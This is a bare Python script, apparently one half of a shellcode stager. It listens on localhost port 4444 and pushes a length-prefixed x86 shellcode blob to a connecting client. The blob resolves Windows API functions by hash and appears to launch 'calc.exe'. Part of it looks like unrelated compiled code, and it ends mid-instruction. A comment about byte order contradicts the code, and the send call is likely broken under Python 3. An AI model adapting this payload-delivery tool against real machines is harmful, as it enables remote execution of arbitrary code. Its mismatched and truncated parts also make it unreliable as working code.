import socket
import time
import struct

shellcode="\xe8\x00\x00\x00\x00\x5b\x89\xdc"
shellcode+="\x81\xec\x00\x10\x00\x00\x81\xe4"
shellcode+="\x00\xff\xff\xff\xb9\x05\x00\x00"
shellcode+="\x00\x8d\xb3\x12\x01\x00\x00\x8d"
shellcode+="\xbb\x32\x01\x00\x00\x6a\x00\xff"
shellcode+="\x36\x68\x88\x4e\x0d\x00\xe8\x21"
shellcode+="\x00\x00\x00\x89\x07\x83\xc7\x04"
shellcode+="\x83\xc6\x04\xe2\xe8\xbf\x00\x00"
shellcode+="\x00\x00\x57\x8d\xbb\x26\x01\x00"
shellcode+="\x00\x57\xff\x93\x42\x01\x00\x00"
shellcode+="\xcc\xcc\xcc\xcc\x55\x89\xe5\x53"
shellcode+="\x56\x57\x51\x64\xff\x35\x30\x00"
shellcode+="\x00\x00\x58\x8b\x40\x0c\x8b\x48"
shellcode+="\x0c\x8b\x11\x8b\x41\x30\x6a\x02"
shellcode+="\x8b\x7d\x08\x57\x50\xe8\x69\x00"
shellcode+="\x00\x00\x85\xc0\x74\x04\x89\xd1"
shellcode+="\xeb\xe7\x8b\x41\x18\x50\x8b\x58"
shellcode+="\x3c\x01\xd8\x8b\x58\x78\x58\x50"
shellcode+="\x01\xc3\x8b\x7b\x10\x8b\x4b\x1c"
shellcode+="\x8b\x53\x20\x8b\x5b\x24\x01\xc1"
shellcode+="\x01\xc2\x01\xc3\x8b\x32\x58\x50"
shellcode+="\x01\xc6\x6a\x01\xff\x75\x0c\x56"
shellcode+="\xe8\x2e\x00\x00\x00\x85\xc0\x74"
shellcode+="\x08\x83\xc2\x04\x83\xc3\x02\xeb"
shellcode+="\xe3\x58\x31\xd2\x66\x8b\x13\x57"
shellcode+="\x8b\x7d\x10\x85\xff\x5f\x74\x02"
shellcode+="\x29\xfa\xc1\xe2\x02\x01\xd1\x03"
shellcode+="\x01\x59\x5f\x5e\x5b\x89\xec\x5d"
shellcode+="\xc2\x0c\x00\x55\x89\xe5\x51\x53"
shellcode+="\x52\x31\xc9\x31\xdb\x31\xd2\x8b"
shellcode+="\x45\x08\x8a\x10\x80\xca\x60\x01"
shellcode+="\xd3\xd1\xe3\x03\x45\x10\x8a\x08"
shellcode+="\x84\xc9\xe0\xee\x31\xc0\x8b\x4d"
shellcode+="\x0c\x39\xcb\x74\x01\x40\x5a\x5b"
shellcode+="\x59\x89\xec\x5d\xc2\x0c\x00\xe6"
shellcode+="\xb2\x9b\x06\x3c\xd1\x38\x00\xfa"
shellcode+="\x8b\x34\x00\x86\x57\x0d\x00\xea"
shellcode+="\x6f\x00\x00\x63\x61\x6c\x63\x2e"
shellcode+="\x65\x78\x65\x00\x00\x00\x00\x00"
shellcode+="\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode+="\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode+="\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode+="\x00\x00\x00\x90\x5d\xc3\x55\x89"
shellcode+="\xe5\x83\xe4\xf0\xb8\xc0\x0f\x00"
shellcode+="\x00\xe8\x8a\x0c\x00\x00\x29\xc4"
shellcode+="\xe8\x33\x06\x00\x00\xc7\x84\x24"
shellcode+="\xb4\x0f\x00\x00\x00\x00\x00\x00"
shellcode+="\xc7\x44\x24\x08\x60\x09\x00\x00"
shellcode+="\xc7\x44\x24\x04\x0d\x15\x40\x00"
shellcode+="\x8d\x44\x24\x10\x89\x04\x24\xe8"
shellcode+="\xbc\x26\x00\x00\x8d\x44\x24\x10"
shellcode+="\x83\xc0\x03\x89\x84\x24\xbc\x0f"
shellcode+="\x00\x00\x8b\x84\x24\xbc\x0f\x00"
shellcode+="\x00\x89\x84\x24\xb0\x0f\x00\x00"
shellcode+="\xc7\x04\x24\x9e\x50\x40\x00\xe8"
shellcode+="\x8c\x26\x00\x00\xc7\x84\x24\xb8"
shellcode+="\x0f\x00\x00\x00\x00\x00\x00\xeb"
shellcode+="\x4a\x8b\x84\x24\xbc\x0f\x00\x00"
shellcode+="\x0f\xb6\x00\x0f\xb6\xc0\x89\x44"
shellcode+="\x24\x04\xc7\x04\x24\xaa\x50\x40"
shellcode+="\x00\xe8\x62\x26\x00\x00\x8b\x84"
shellcode+="\x24\xb8\x0f\x00\x00\x83\xc0\x01"
shellcode+="\x83\xe0\x07\x85\xc0\x75\x0c\xc7"
shellcode+="\x04\x24\xb2\x50\x40\x00\xe8\x45"
shellcode+="\x26\x00\x00\x83\x84\x24\xbc\x0f"
shellcode+="\x00\x00\x01\x83\x84\x24\xb8\x0f"
shellcode+="\x00\x00\x01\x81\xbc\x24\xb8\x0f"
shellcode+="\x00\x00\x99\x02\x00\x00\x7e\xa9"
shellcode+="\xc7\x04\x24\xc1\x50\x40\x00\xe8"
shellcode+="\x14\x26\x00\x00\x8b\x84\x24\xbc"
shellcode+="\x0f\x00\x00\x89\x04\x24\xe8\x15"
shellcode+="\xfd\xff\xff\x85\xc0\x75\x0b\xc7"
shellcode+="\x84\x24\xb4\x0f\x00\x00\x01\x00"
shellcode+="\x00\x00\x83\xbc\x24\xb4\x0f\x00"
shellcode+="\x00\x00\x74\x09\x8b\x84\x24\xb0"
shellcode+="\x0f\x00\x00\xff\xd0\xb8\x00\x00"
shellcode+="\x00\x00\xc9\xc3\x66\x90\x66\x90"
shellcode+="\x66\x90\x66\x90\x66\x90\x66\x90"
shellcode+="\x55\x89\xe5\x57\x56\x53\x83\xec"
shellcode+="\x4c\xf6\x05\x04\x40\x40\x00\x02"
shellcode+="\x0f\x84\xea\x02\x00\x00\xe8\x95"
shellcode+="\x26\x00\x00\x89\x65\xc4\x89\x04"
shellcode+="\x24\x89\xc6\xe8\x80\x25\x00\x00"
shellcode+="\x8d\x44"

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 4444        # Port to listen on (non-privileged ports are > 1023)

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind((HOST, PORT))
serversocket.listen(2)

(conn, addr) = serversocket.accept()
print('Connected by', addr)

# big-endian cause hton, ntoh client
conn.send( struct.pack('<I', len(shellcode)) )
time.sleep(5)
#conn.send( struct.pack('>S', shellcode) )
conn.send( shellcode )
print("[+] Shellcode uploaded, length:%d" % len(shellcode))
time.sleep(2)

conn.close()
serversocket.close()
print("[+] Done")
#   data = conn.recv(1024)
#   if not data:
#       break
#   conn.sendall(data)


